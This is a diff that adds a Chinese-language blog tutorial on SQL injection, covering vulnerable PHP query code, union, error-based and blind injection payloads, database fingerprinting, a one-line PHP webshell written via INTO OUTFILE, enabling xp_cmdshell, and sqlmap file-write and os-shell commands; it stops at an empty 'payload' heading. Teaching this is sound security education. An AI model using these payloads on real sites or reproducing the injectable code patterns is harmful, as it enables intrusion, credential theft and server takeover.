@@ -152,6 +152,467 @@
           <div id="js-content" class="content-ll">
             
   
+    <article id="post-安全进阶/SQL注入原理与实践进阶" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+  <div class="article-inner">
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2021/04/18/%E5%AE%89%E5%85%A8%E8%BF%9B%E9%98%B6/SQL%E6%B3%A8%E5%85%A5%E5%8E%9F%E7%90%86%E4%B8%8E%E5%AE%9E%E8%B7%B5%E8%BF%9B%E9%98%B6/">SQL注入原理与实践进阶</a>
+    </h1>
+  
+
+        
+        <a href="/2021/04/18/%E5%AE%89%E5%85%A8%E8%BF%9B%E9%98%B6/SQL%E6%B3%A8%E5%85%A5%E5%8E%9F%E7%90%86%E4%B8%8E%E5%AE%9E%E8%B7%B5%E8%BF%9B%E9%98%B6/" class="archive-article-date">
+  	<time datetime="2021-04-18T01:41:12.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2021-04-18</time>
+</a>
+        
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h2 id="SQL注入的原理"><a href="#SQL注入的原理" class="headerlink" title="SQL注入的原理"></a>SQL注入的原理</h2><p>动态页面有时会通过脚本引擎将用户输入的参数按照预先设定的规则构造成SQL语句来进行数据库操作，<strong>SQL注入攻击</strong>指的是通过<strong>构建特殊的输入作为参数传入Web应用程序，</strong>改变原有的SQL语句的语义来执行攻击者所要的操作，其主要原因是程序<strong>没有采用必要的措施避免用户输入内容改变原有SQL语句的语义。</strong></p>
+<h3 id="从程序编写的角度看SQL注入"><a href="#从程序编写的角度看SQL注入" class="headerlink" title="从程序编写的角度看SQL注入"></a>从程序编写的角度看SQL注入</h3><p>SQL注入漏洞产生的本质原因是<strong>将获取到的用户可控数据在没有经过安全处理的情况下拼接到SQL语句中并发送给数据库服务器执行导致的。</strong></p>
+<pre><code class="php">&lt;?php
+$con = mysqli_connect(&quot;127.0.0.1&quot;,&quot;root&quot;,&quot;root&quot;,sqleasy);
+$newsid=$_GET[&#39;newsid&#39;];   //用户可控输入(GET请求的newsid参数)
+
+//拼接到了发送数据库服务器执行的SQL语句中
+$result = mysqli_query($con,&quot;SELECT title,context FROM `news` WHERE newsid=&#39;$newsid&#39;&quot;);
+$row = mysqli_fetch_array($result);
+
+echo &quot;公告标题 : &quot;.$row[&#39;title&#39;].&quot;&lt;br/&gt;&quot;;
+echo &quot;公告内容 : &quot;.$row[&#39;context&#39;].&quot;&lt;br/&gt;&quot;;
+?&gt;</code></pre>
+<h3 id="SQL注入的常见场景"><a href="#SQL注入的常见场景" class="headerlink" title="SQL注入的常见场景"></a>SQL注入的常见场景</h3><h4 id="数据查询功能"><a href="#数据查询功能" class="headerlink" title="数据查询功能"></a>数据查询功能</h4><p>数据查询功能是WEB应用最常见的功能之一，实现方式就是<strong>根据用户提交的查询条件将数据库中的信息查询出来并显示在页面上，此时用户提交的数据通常被拼接到SQL语句的查询条件位置（即where之后）</strong>，这种情况下如果没有进行安全处理，使用<strong>联合查询注入</strong>的方式可以很方便的获取数据库的敏感信息。</p>
+<ul>
+<li>程序员思维</li>
+</ul>
+<pre><code class="php">//获取用户的查询条件：
+$newsid=$_GET[&#39;newsid&#39;];
+
+//构造SQL语句查询相关信息
+$result = mysqli_query($con,&quot;SELECT title,context 
+FROM `news` WHERE newsid=$newsid&quot;);
+
+//将结果显示在页面上：
+$row = mysqli_fetch_array($result);
+echo &quot;公告标题 : &quot;.$row[&#39;title&#39;].&quot;&lt;br/&gt;&quot;;
+echo &quot;公告内容 : &quot;.$row[&#39;context&#39;].&quot;&lt;br/&gt;&quot;</code></pre>
+<ul>
+<li>黑客思维</li>
+</ul>
+<pre><code class="sql">联合查询注入
+http://127.0.0.1/sqleasy_webjj/news.php?newsid=0 union select username,password from admin;
+
+实际执行语句
+SELECT title,context FROM `news` WHERE newsid=0 union select username,password from admin;</code></pre>
+<h4 id="登录功能"><a href="#登录功能" class="headerlink" title="登录功能"></a>登录功能</h4><p>登录功能也是WEB应用的常见功能之一，通常的实现方式就是<strong>将用户输入的用户名和密码在数据库中查询，如果有匹配的结果说明用户名密码正确，即判断为登录成功，否则就登录失败。</strong>这个过程中用户输入的用户名和密码通常也会被拼接到SQL语句的查询条件位置（即where之后），这种情况下如果没有进行安全处理，<strong>攻击者可以插入恶意的SQL语句改变判断条件的结果，达到登录任意账号的目的（即通常说的万能密码攻击）。</strong></p>
+<ul>
+<li>程序员思维</li>
+</ul>
+<pre><code class="php">//获取用户输入的用户名和密码：
+$name=$_POST[&#39;username&#39;]; 
+$pwd=$_POST[&#39;password&#39;];
+
+//构造SQL语句查询admin表中是否有匹配的信息
+$result = mysqli_query($con,&quot;select * from admin 
+where username=&#39;$name&#39; and password=&#39;$pwd&#39;&quot;);
+
+//根据结果集是否为空判断账号密码是否存在
+$res=mysql_fetch_array($result); 
+if(is_array($res))&#123;
+$login=true;    
+&#125;else&#123; 
+   $login=false; &#125;</code></pre>
+<ul>
+<li>黑客思维</li>
+</ul>
+<p><img src="https://i.loli.net/2021/04/23/PrFV5YDpbjoJUa8.png" alt="image-20210423162120756"></p>
+<pre><code class="sql">实际执行语句
+select * from admin where username=&#39;jiaoshou&#39;or&#39;1&#39; and password=&#39;adjflajsdlfl&#39;</code></pre>
+<h4 id="程序将错误信息直接返回页面"><a href="#程序将错误信息直接返回页面" class="headerlink" title="程序将错误信息直接返回页面"></a>程序将错误信息直接返回页面</h4><p>为了方便程序调试，许多程序员会<strong>将SQL查询的报错信息直接回显到页面上。</strong>这种情况下黑客可以<strong>利用特殊的<br>函数或者语法构造错误的SQL语句，使得敏感数据通过报错信息直接回显到页面上。</strong>对于<strong>在线的WEB系统</strong>而言，<br>程序的<strong>错误信息应该记录到日志中</strong>，而不是显示在页面上。</p>
+<ul>
+<li>程序员思维</li>
+</ul>
+<pre><code class="php">//在SQL语句执行后打印报错信息，方便调试
+$result = mysqli_query($con,&quot;SELECT title,context FROM `news` WHERE newsid=&#39;$newsid&#39;&quot;);
+if(!empty(mysqli_error($con)))&#123; 
+    echo mysqli_error($con);
+&#125;
+
+//mysqli_error() 函数返回最近调用函数的最后一个错误描述。
+//empty($var) empty()用来检查变量var是否为空，若var为空则返回true，当var存在且是一个非空非零的值时返回false。</code></pre>
+<ul>
+<li>黑客思维</li>
+</ul>
+<p><img src="https://i.loli.net/2021/04/23/wiyFLTR1EuBmsJg.png" alt="image-20210423171401714"></p>
+<pre><code class="sql">实际执行语句：SELECT title,context FROM `news` WHERE newsid= 11 and extractvalue(1,concat(0x7e,(select database()),0x7e))</code></pre>
+<h4 id="基于查询条件返回判断结果"><a href="#基于查询条件返回判断结果" class="headerlink" title="基于查询条件返回判断结果"></a>基于查询条件返回判断结果</h4><p>有时候某些功能是<strong>根据用户输入的查询条件，去数据库中查询相关数据，但不会返回查询结果，而是根据查询<br>结果的情况返回某些信息。</strong>例如，根据学生学号查询成绩，根据查询到的分数返回是否及格（而不是具体分数）。<br>由于数据库中的信息不会直接返回到页面，<strong>无法使用联合查询注入</strong>，如果程序员<strong>也没有输出报错信息到页面上</strong>，那<br>么我们是无法直接通过SQL注入获取数据的。此时，<strong>可以采用盲注的方式来尝试获取数据。</strong></p>
+<ul>
+<li>程序员思维</li>
+</ul>
+<pre><code class="php">//获取用户输入的学生id
+$id = $_GET[&#39;id&#39;];
+//构造SQL语句查询info表中是否有匹配的信息
+$result = mysqli_query($con, &quot;SELECT score FROM `info` WHERE id=&#39;$id&#39;&quot;);
+$row = mysqli_fetch_array($result);
+//判断结果是否为空
+    if (is_array($row)) &#123;     //is_array用于检测变量是否为一个数组
+//判断成绩是否及格
+        if ($row[&#39;score&#39;] &gt;= 60) &#123;
+            echo &quot;$id 号同学，恭喜你，成绩及格了&quot;;
+        &#125; else &#123;echo &quot;$id 号同学，很遗憾，你没有及格&quot;;&#125;
+    &#125; else &#123;echo &quot;对不起，你输入的学号不存在&quot;;&#125;&#125;</code></pre>
+<ul>
+<li>黑客思维</li>
+</ul>
+<p><img src="https://i.loli.net/2021/04/23/4r2Vj7gG9L6NuQT.png" alt="image-20210423171310802"></p>
+<pre><code class="sql">--substr(string,1,1) 返回字符串的一部分。例如下方代码，返回从第1个到第1个字符
+-- 实际执行语句：
+SELECT score FROM `info` WHERE id=1024 and substr(database(),1,1)=&#39;s&#39;</code></pre>
+<h4 id="数据的插入、修改与删除功能"><a href="#数据的插入、修改与删除功能" class="headerlink" title="数据的插入、修改与删除功能"></a>数据的插入、修改与删除功能</h4><p>除了查询相关的功能以外，对数据库的数据进行数据插入、修改、删除操作也是常见的功能（insert、update<br>、delete），这些功能与查询语句不同的是并不会返回结果集数据（只会返回成功失败的状态码），如果又没有输<br>出报错信息，即使用户输入的数据没有进行安全处理，也难以使用联合查询、报错注入、布尔型盲注等方式注入，<br>这时，<strong>可以采用时间型盲注进行注入。</strong></p>
+<ul>
+<li>程序员思维</li>
+</ul>
+<pre><code class="php">//获取用户输入的信息
+$username = $_POST[&#39;username&#39;];
+$passwd = $_POST[&#39;passwd1&#39;];
+$question = $_POST[&#39;question&#39;];
+$answer = $_POST[&#39;answer&#39;];
+//构造SQL语句将用户输入的信息插入数据库
+$query = &quot;INSERT INTO 
+admin(role,username,password,question,answer) VALUES 
+(&#39;student&#39;,&#39;$username&#39;,&#39;$passwd&#39;,&#39;$question&#39;,&#39;$answer&#39;
+)&quot;;
+mysql_query($query) or die(&quot;Error!!&quot;);</code></pre>
+<ul>
+<li>黑客思维</li>
+</ul>
+<p><img src="C:\Users\86177\AppData\Roaming\Typora\typora-user-images\image-20210423172110563.png" alt="image-20210423172110563"></p>
+<pre><code class="sql">--实际执行语句：
+INSERT INTO admin(role,username,password,question,answer) 
+VALUES (&#39;student&#39;,&#39;test2&#39;,&#39;test2&#39;,&#39;&#39;,if(left(database(),1)=&#39;s&#39;,sleep(3),0))#&#39;,&#39;ndsec&#39;)</code></pre>
+<h3 id="SQL注入的分类"><a href="#SQL注入的分类" class="headerlink" title="SQL注入的分类"></a>SQL注入的分类</h3><table>
+<thead>
+<tr>
+<th align="center">基于注入点位置分类</th>
+<th align="center">基于变量数据类型分类</th>
+<th align="center">基于获取数据的方法分类</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="center">GET注入、POST注入、Cookie注入</td>
+<td align="center">字符型注入、数字型注入</td>
+<td align="center">基于回显、基于错误、盲注(布尔型盲注、基于时间盲注)</td>
+</tr>
+</tbody></table>
+<h2 id="SQL注入点的查找与判断"><a href="#SQL注入点的查找与判断" class="headerlink" title="SQL注入点的查找与判断"></a>SQL注入点的查找与判断</h2><h3 id="SQL注入测试方法"><a href="#SQL注入测试方法" class="headerlink" title="SQL注入测试方法"></a>SQL注入测试方法</h3><p>SQL注入漏洞的测试主要包括<strong>寻找可能的注入点</strong>以及<strong>针对可能的注入点进行测试</strong>两个环节，核心思路和流程如下：</p>
+<p><img src="https://i.loli.net/2021/04/23/qFYGkpnrQszyJUK.png" alt="image-20210423172821267"></p>
+<h3 id="寻找可能的注入点"><a href="#寻找可能的注入点" class="headerlink" title="寻找可能的注入点"></a>寻找可能的注入点</h3><h4 id="服务器能取到的用户输入"><a href="#服务器能取到的用户输入" class="headerlink" title="服务器能取到的用户输入"></a>服务器能取到的用户输入</h4><p>（1）<strong>任何服务器能取到的用户输入，都是可能存在SQL注入的注入点，</strong>对于手工测试而言，通常根据业务找寻可能与数据库有交互的输入作为潜在的注入点进行测试。</p>
+<p>（2）常见注入点：</p>
+<ul>
+<li>表单提交，主要是POST请求，也包括GET请求。</li>
+<li>URL参数提交，主要为GET请求参数。</li>
+<li>Cookie参数提交。</li>
+<li>HTTP请求头部可修改的值，比如：Referer、User_Agent等。</li>
+<li>边缘的输入点，比如.mp3文件的一些文件信息等。</li>
+</ul>
+<p><strong>PS：以PHP为例，通过各类超全局变量可以取到各类用户输入，这些都是潜在的注入点</strong></p>
+<h4 id="常见的注入点"><a href="#常见的注入点" class="headerlink" title="常见的注入点"></a>常见的注入点</h4><ul>
+<li>GET请求和POST请求的参数值是最常见的注入点，是测试时需要重点关注的地方。</li>
+<li>除了标准的请求参数值，采用一些特殊数据传输格式的参数值也有可能存在注入点，如JSON或XML格式传输的参<br>数值。</li>
+</ul>
+<p><img src="https://i.loli.net/2021/04/23/ESf3YZi76wldJCF.png" alt="image-20210423181050875"></p>
+<p><img src="https://i.loli.net/2021/04/23/nlqosbjvWRXBi59.png" alt="image-20210423181119960"></p>
+<ul>
+<li>Cookie中的一些字段有时也会用于数据库查询或其他操作，往往也是需要关注的潜在注入点。</li>
+</ul>
+<p><img src="https://i.loli.net/2021/04/23/6OvbCryUKpWoDMh.png" alt="image-20210423181155681"></p>
+<ul>
+<li>HTTP请求头部的其他字段也可能存在注入点，如refer字段有时会被写入数据库。</li>
+</ul>
+<p><img src="https://i.loli.net/2021/04/23/A8XJ4hVqDHrg3sc.png" alt="image-20210423181231673"></p>
+<h3 id="SQL注入点的测试"><a href="#SQL注入点的测试" class="headerlink" title="SQL注入点的测试"></a>SQL注入点的测试</h3><h4 id="基本思路"><a href="#基本思路" class="headerlink" title="基本思路"></a>基本思路</h4><p>SQL注入点的测试本质上是基于原理的模糊测试，我们需要根据一个注入点的功能，推测其可能使用的SQL操作、用户输入的数据类型（数字型或字符型）以及用户输入拼接到SQL语句的位置，并尝试构造基础的报错注入语句、布尔盲注或时间盲注语句来验证相关位置是否存在sql注入漏洞。</p>
+<p><strong>注意：在未知源码的情况下，我们只能尽可能尝试构造各类测试语句来对注入点进行测试，如果测试现象符合条件可以认为存在SQL注入漏洞，但测试现象不符合预期并不能100%确定SQL注入漏洞不存在。</strong></p>
+<p><img src="https://i.loli.net/2021/04/23/htUOibI7gH4QRcA.png" alt="image-20210423184225134"></p>
+<h4 id="构造报错注入语句"><a href="#构造报错注入语句" class="headerlink" title="构造报错注入语句"></a>构造报错注入语句</h4><p>在进行SQL注入点测试的时候，<strong>构造报错注入语句是第一步，</strong>报错注入语句的构造相对简单，通常<strong>只要在参数值中增加一些常见的符号就可以让SQL语句产生语法错误</strong>，常见可使用的符号包括单引号、双引号、括号、分号、冒号、斜杠、反斜杠等，可以将这些符号<strong>组合使用</strong>进行尝试。</p>
+<p><img src="https://i.loli.net/2021/04/23/VW2uQz5rx4UHpiv.png" alt="image-20210423184705988"></p>
+<h4 id="报错注入结果判断"><a href="#报错注入结果判断" class="headerlink" title="报错注入结果判断"></a>报错注入结果判断</h4><p>（1）<strong>出现数据库原始报错信息，可以确定存在SQL注入漏洞.</strong></p>
+<p><img src="https://i.loli.net/2021/04/23/WrFHQOf7xXAzcVZ.png" alt="image-20210423184915060"></p>
+<p><img src="https://i.loli.net/2021/04/23/YqhPbHlTLux1oE3.png" alt="image-20210423184815009"></p>
+<p>（2）在输入某些测试payload时导致页面显示异常，包括结果显示异常或出现通用报错信息，都有可能是SQL注入漏洞但也有可能是系统正常的错误处理机制导致的，需要进一步测试。对于没有回显的语句（如插入、修改功能），可以<strong>根据操作结果返回包的状态码、包长度等信息推测SQL语句是否出错。</strong></p>
+<h4 id="布尔型盲注语句的构造"><a href="#布尔型盲注语句的构造" class="headerlink" title="布尔型盲注语句的构造"></a>布尔型盲注语句的构造</h4><p>（1）布尔型盲注语句需要在涉及判断的功能中才能使用，其中最常见的就是在查询条件的位置，分别拼接一段结果为真和结果为假的判断语句，如果<strong>结果为真时显示效果与原来一致，结果为假时查询不到数据或与原来数据不一致，则认为存在布尔型盲注。</strong></p>
+<p>（2）布尔型盲注的本质就是构造两个分别为真和假的表达式，只要符按照这个思路，可以任意进行构造。</p>
+<p><img src="https://i.loli.net/2021/04/23/lBdabnu4yxCEhwV.png" alt="image-20210423185446985"></p>
+<p><img src="https://i.loli.net/2021/04/23/TCYSLltKdFQJ1nu.png" alt="image-20210423185511489"></p>
+<h4 id="时间型盲注语句构造"><a href="#时间型盲注语句构造" class="headerlink" title="时间型盲注语句构造"></a>时间型盲注语句构造</h4><p>（1）对于没有涉及判断的功能，如插入、更新等语句的数据位置（而非条件语句的位置），或者布尔型盲注的结果无法判断的（如显示均正常或均异常），可以尝试使用时间型盲注语句进行测试，<strong>如果插入时间型盲注语句后服务器延时响应，则认为存在SQL注入漏洞。</strong></p>
+<p>（2）与其他测试方式不同的是，时间型盲注依赖于时间相关函数或语法，每个数据库的函数并不相同只能进行尝试。<br>在实际使用中，通常有直接调用延时函数（或语法）和调用耗时较高的函数（或语法）两种方式：</p>
+<table>
+<thead>
+<tr>
+<th align="center">直接调用延时函数（或语法）</th>
+<th align="center">调用耗时较高的函数（或语法）</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="center">MySQL和SQLserver提供了可直接调用的延时函数和语法，如MySQL的sleep()函数和SQLserver的waitfor()语法可直接调用</td>
+<td align="center">针对其他数据库或延时函数(语法)不适用时可以尝试调用耗时较高的函数或语法。如：select BENCHMARK(10000000,MD5(‘a’));</td>
+</tr>
+</tbody></table>
+<p>（3）Mysql：SLEEP函数可以实现延迟，在所有数据位置均可以使用:</p>
+<pre><code>对于数字型SQL注入，通常直接拼接判断语句即可
+SELECT title,context FROM `news` WHERE newsid= 11 and sleep(10)
+对于字符型SQL注入点，通常需要使用单引号或双引号闭合原有的单双引号才能进行拼接
+SELECT score FROM `info` WHERE name=&#39;lilei&#39;and sleep(10) and &#39;1&#39;</code></pre>
+<p>（4）SQLserver：WAITFOR DELAY 语句可以实现，通常需要跟在条件判断语句之后:</p>
+<pre><code>对于数字型SQL注入，通常直接拼接判断语句即可
+SELECT title,context FROM `news` WHERE newsid= 11 waitfor delay &#39;0:0:4&#39;
+对于字符型SQL注入点，通常需要使用单引号或双引号闭合原有的单双引号才能进行拼接
+SELECT score FROM `info` WHERE name=&#39;lilei&#39; waitfor delay &#39;0:0:4’</code></pre>
+<h4 id="时间型盲注的结果判断"><a href="#时间型盲注的结果判断" class="headerlink" title="时间型盲注的结果判断"></a>时间型盲注的结果判断</h4><p>时间型盲注的结果判断主要是根据服务器的响应结果，如果在<strong>加入时间型盲注语句后服务器响应有明显的延时，可以判断SQL注入漏洞存在。</strong>为了排除网络环境影响，可以尝试不同延时量的时间型盲注语句，根据延时的差异进一步进行确认。使用Firefox的firebug插件可以准确的跟踪延时信息。</p>
+<h2 id="SQL注入漏洞的利用"><a href="#SQL注入漏洞的利用" class="headerlink" title="SQL注入漏洞的利用"></a>SQL注入漏洞的利用</h2><h3 id="SQL注入的核心利用目标"><a href="#SQL注入的核心利用目标" class="headerlink" title="SQL注入的核心利用目标"></a>SQL注入的核心利用目标</h3><p>（1）SQL注入的核心利用目标主要包括以下三类：</p>
+<ul>
+<li>操作数据</li>
+</ul>
+<pre><code>•查询数据是SQL注入最常见的一种利用方式，网站数据库中通常存储着大量有价值的数据，通过批量查询数据
+的方式可以获取这些数据，也就是人们常说的“拖库”。
+•数据库中通常还存储着WEB应用的管理后台账号密码，通过获取管理后台账号密码可以更加方便的提取数据、
+进行更多操作或为进一步攻击提供便利，因此网站管理后台账号密码往往是数据查询的第一目标
+•除了查询以外，也可以对数据进行增删改操作，达到更多的非法目的</code></pre>
+<ul>
+<li>读写文件</li>
+</ul>
+<pre><code>如果数据库的配置权限不当，攻击者可以通过SQL语句读写文件来进行进一步攻击以获取更多的权限，如读取
+网站配置文件、修改注册表文件、上传木马等。</code></pre>
+<ul>
+<li>执行命令</li>
+</ul>
+<pre><code>如果数据库的配置权限不当，攻击者可以通过SQL语句执行操作系统命令来进行进一步攻击获取更多的权限，
+如开放远程连接服务、创建系统用户、配合文件读写功能完成反弹shell等。</code></pre>
+<h3 id="SQL注入利用的基本流程"><a href="#SQL注入利用的基本流程" class="headerlink" title="SQL注入利用的基本流程"></a>SQL注入利用的基本流程</h3><p>（1）注入点分析</p>
+<ul>
+<li>注入点位置</li>
+<li>数字型/字符型</li>
+<li>可利用的注入方式（联合查询、报错注入、盲注等）</li>
+</ul>
+<p>（2）判断数据库类型</p>
+<ul>
+<li>MySQL</li>
+<li>SQLserver</li>
+<li>Oracle</li>
+<li>PostgreSQL</li>
+</ul>
+<p>（3）选择漏洞利用目标</p>
+<ul>
+<li>操作数据</li>
+<li>读写文件</li>
+<li>执行命令</li>
+</ul>
+<p>（4）构造漏洞利用语句</p>
+<ul>
+<li>基础利用语句</li>
+<li>绕过过滤</li>
+</ul>
+<h3 id="数据库类型判断"><a href="#数据库类型判断" class="headerlink" title="数据库类型判断"></a>数据库类型判断</h3><p>（1）基于WEB开发语言（推测）</p>
+<ul>
+<li>Asp、aspx通常与access、sqlserver一起使用</li>
+<li>Php通常与mysql、PostgreSQL一起使用</li>
+<li>Jsp通常与oracle和mysql一起使用</li>
+</ul>
+<p>（2）基于报错信息：数据库报错信息通常会暴露数据库类型，可以帮助我们有效判断数据库类型</p>
+<p>（3）基于数据库特性：某些函数、内置表或语法为某些数据库特有，利用这些特性构造相关语句可以<br>帮助我们判断出数据库类型。</p>
+<h4 id="基于报错信息判断"><a href="#基于报错信息判断" class="headerlink" title="基于报错信息判断"></a>基于报错信息判断</h4><p>（1）MySQL：MySQL server字样</p>
+<p><img src="https://i.loli.net/2021/04/24/ocZSYJDwniUq43T.png" alt="image-20210424092955963"></p>
+<p>（2）Oracle：ORA-XXXX字样</p>
+<p><img src="https://i.loli.net/2021/04/24/XtGoqIR2vQkrgmw.png" alt="image-20210424093056008"></p>
+<p>（3）SQLite</p>
+<p><img src="https://i.loli.net/2021/04/24/mOEqc8KFakntS1u.png" alt="image-20210424093122849"></p>
+<h4 id="基于数据库特性判断"><a href="#基于数据库特性判断" class="headerlink" title="基于数据库特性判断"></a>基于数据库特性判断</h4><p>（1）ACCESS</p>
+<pre><code>and (select count (*) from sysobjects)&gt;0返回异常
+and (select count (*) from msysobjects)&gt;0返回异常</code></pre>
+<p>（2）SQLSERVER</p>
+<pre><code>and (select count (*) from sysobjects)&gt;0 返回正常
+and (select count (*) from msysobjects)&gt;0返回异常</code></pre>
+<p>（3）MySQL</p>
+<pre><code>id=2 and version()&gt;0 返回正常
+id=2 and length(user())&gt;0返回正常
+id=2 CHAR(97, 110, 100, 32, 49, 61, 49)返回正常</code></pre>
+<p>（4）Oracle</p>
+<pre><code>and length (select user from dual)&gt;0 返回正常</code></pre>
+<h2 id="SQL注入利用-操作数据-数据查询"><a href="#SQL注入利用-操作数据-数据查询" class="headerlink" title="SQL注入利用-操作数据-数据查询"></a>SQL注入利用-操作数据-数据查询</h2><p>操作数据是SQL注入漏洞最常见的利用方式，其中利用SQL注入查询敏感数据又是操作数据最常见的利用方法，具体流程如下：</p>
+<p>（1）掌握基础知识</p>
+<ul>
+<li>关键表</li>
+<li>关键内置函数</li>
+<li>其他特性</li>
+<li>编码技巧</li>
+</ul>
+<p>（2）选择提取方式</p>
+<ul>
+<li>联合查询</li>
+<li>报错注入</li>
+<li>布尔盲注</li>
+<li>时间盲注</li>
+</ul>
+<p>（3）构造原始语句</p>
+<ul>
+<li>获取数据库名</li>
+<li>获取关键表</li>
+<li>获取关键字段</li>
+<li>获取目标数据</li>
+</ul>
+<p>（4）绕过防护策略</p>
+<ul>
+<li>大小写</li>
+<li>回车换行</li>
+<li>截断</li>
+<li>特殊字符</li>
+<li>特殊函数</li>
+</ul>
+<h3 id="数据提取方式"><a href="#数据提取方式" class="headerlink" title="数据提取方式"></a>数据提取方式</h3><p>（1）联合查询</p>
+<ul>
+<li>构造联合查询语句，将目标数据直接查询出来并显示在页面上</li>
+<li>目标数据直接在页面显示内容中提取</li>
+</ul>
+<p>（2）报错注入</p>
+<ul>
+<li>构造错误的SQL语句，并将目标数据在报错信息中直接显示</li>
+<li>必须在网站回显原始报错数据的情况下使用</li>
+<li>目标数据在报错信息中提取</li>
+</ul>
+<p>（3）布尔型盲注</p>
+<ul>
+<li>构造特殊的SQL语句对目标数据进行猜测，使得猜测正确时与猜测错误时页面回显内容不同</li>
+<li>根据页面显示结果推断目标数据内容</li>
+</ul>
+<p>（4）时间盲注</p>
+<ul>
+<li>构造特殊的SQL语句对目标数据进行猜测，使得猜测正确时与猜测错误时页面响应时间不同</li>
+<li>根据页面响应时间推断目标数据内容</li>
+</ul>
+<h3 id="数据查询语句构造"><a href="#数据查询语句构造" class="headerlink" title="数据查询语句构造"></a>数据查询语句构造</h3><h4 id="构造原始语句"><a href="#构造原始语句" class="headerlink" title="构造原始语句"></a>构造原始语句</h4><p>查询当前数据库–&gt;查询关键表–&gt;查询关键字段–&gt;提取目标数据</p>
+<h4 id="联合查询"><a href="#联合查询" class="headerlink" title="联合查询"></a>联合查询</h4><p>UNION 操作符用于合并两个或多个 SELECT 语句的结果集。UNION 内部的 SELECT 语句必须拥有<strong>相同<br>数量的列。</strong>列也必须拥有<strong>相似的数据类型（MySQL为弱类型数据库，可不需要相似数据类型）。</strong>当UNION之前的select语句结果集为空时，查询结果将由UNION后的SELECT语句控制。</p>
+<p><img src="https://i.loli.net/2021/04/25/quXcnafewH7YOUo.png" alt="image-20210425194312073"></p>
+<h4 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h4><p><img src="https://i.loli.net/2021/04/25/w1aF8Kxtq5CLrdG.png" alt="image-20210425194416463"></p>
+<h4 id="布尔型盲注"><a href="#布尔型盲注" class="headerlink" title="布尔型盲注"></a>布尔型盲注</h4><p><img src="https://i.loli.net/2021/04/25/9XQNd6ziu2qKYsc.png" alt="image-20210425194549389"></p>
+<h4 id="时间型盲注"><a href="#时间型盲注" class="headerlink" title="时间型盲注"></a>时间型盲注</h4><p>（1）时间型盲注与布尔型盲注的语句构造过程类似，通常在布尔型盲注表达式的基础上<strong>使用IF语句加入延时语句来构造，</strong>由于时间型盲注耗时较大，通常利用脚本工具来执行，在手工利用的过程中较少使用。</p>
+<p><img src="https://i.loli.net/2021/04/25/kXfIo6OZPv9malA.png" alt="image-20210425194748742"></p>
+<p>（2）说明：</p>
+<ul>
+<li>通常使用sleep()等专用的延时函数来进行时间盲注，特殊情况下也可以使用某些耗时较高的操作代替这些函数。</li>
+<li>为了提高效率，通常在表达式判断为真时执行延时语句。</li>
+<li>时间盲注语句拼接时无特殊要求，保证语法正确即可。</li>
+</ul>
+<h2 id="SQL注入利用-读写文件"><a href="#SQL注入利用-读写文件" class="headerlink" title="SQL注入利用-读写文件"></a>SQL注入利用-读写文件</h2><p>（1）读写权限判断</p>
+<ul>
+<li>关键函数</li>
+<li>关键值</li>
+</ul>
+<p>（2）绝对路径获取：基于报错信息</p>
+<p>（3）文件读取/写入</p>
+<ul>
+<li>文件读取函数</li>
+<li>文件写入函数</li>
+</ul>
+<h3 id="读写文件基础知识"><a href="#读写文件基础知识" class="headerlink" title="读写文件基础知识"></a>读写文件基础知识</h3><p>（1）Windows下：修改my.ini在[mysqld]内加入secure_file_priv=</p>
+<p>Linux下：修改my.cnf在[mysqld]内加入secure_file_priv=</p>
+<p>（2）然后重启mysql，再查询secure_file_priv</p>
+<pre><code>show variables like &#39;%secure%&#39;;
+//若secure_file_priv值为null，表示限制mysqld不允许导入/导出
+//值为/tmp/，表示限制mysqld的导入/导出只能发生在/tmp/目录下
+//若secure_file_priv值没有具体值时，表示不对mysqld的导入/导出做限制。</code></pre>
+<p>（3）读文件：select load_file(“xxx”)</p>
+<p>写文件：select xxx into outfile、select xxx into dumpfile。outfile可以写入多行，dumpfile只能写入一行。</p>
+<p>利用SQL注入写入一句话木马。需要知道网站的绝对路径（phpinfo\报错页面\Apache默认页面\目录遍历漏洞。</p>
+<pre><code class="sql">select &quot;&lt;?php @eval($_POST[cmd]);?&gt;&quot; into outfile &quot;D:\\flag.php&quot;;  -- widows下路径要加双斜杠，第一个斜杠表示转义</code></pre>
+<h2 id="SQL注入利用-执行命令"><a href="#SQL注入利用-执行命令" class="headerlink" title="SQL注入利用-执行命令"></a>SQL注入利用-执行命令</h2><p>（1）当数据库是<strong>SQL SERVER</strong>的时候可以利用xp_cmdshell存储过程执行系统命令。在数据库中需要执行以下语句开启xp_cmdshell存储过程。</p>
+<pre><code>EXEC sp_configure &#39;show advanced options&#39;, 1;RECONFIGURE;
+EXEC sp_configure &#39;xp_cmdshell&#39;, 
+1;
+RECONFIGURE;</code></pre>
+<p><img src="https://i.loli.net/2021/04/25/AdeurYM6LOmqEZv.png" alt="image-20210425200005888"></p>
+<p>（2）开启之后使用xp_cmdshell可以执行系统命令，如下图所示使用该存储过程可以添加一个管理员组的用户</p>
+<h2 id="扩展："><a href="#扩展：" class="headerlink" title="扩展："></a>扩展：</h2><h2 id="二次注入"><a href="#二次注入" class="headerlink" title="二次注入"></a>二次注入</h2><h2 id="SQL注入写马"><a href="#SQL注入写马" class="headerlink" title="SQL注入写马"></a>SQL注入写马</h2><p><strong>大前提：需要知道网站的绝对路径（phpinfo\报错页面\Apache默认页面\目录遍历漏洞。</strong></p>
+<h3 id="利用SQLMAP写马"><a href="#利用SQLMAP写马" class="headerlink" title="利用SQLMAP写马"></a>利用SQLMAP写马</h3><p>payload：</p>
+<pre><code>sqlmap -u &quot;URL&quot; -c &quot;Cookie&quot; --file-write &quot;Content&quot; --file-dest &quot;Path&quot;
+sqlmap -u &quot;URL&quot; -c &quot;Cookie&quot; --os--shell</code></pre>
+<h3 id="利用语句写马"><a href="#利用语句写马" class="headerlink" title="利用语句写马"></a>利用语句写马</h3><p>前提：secure_file_priv变量值不为NULL，为网站根目录</p>
+<p>MySQL版本：</p>
+<pre><code>MySQL&lt;5.6.34：secure_file_priv可以使用set global secure_file_priv=&quot;path&quot;修改
+MySQL&gt;5.6.34：secure_file_priv不可以使用set global secure_file_priv=&quot;path&quot;修改，且参数默认值为NULL</code></pre>
+<p>payload：</p>
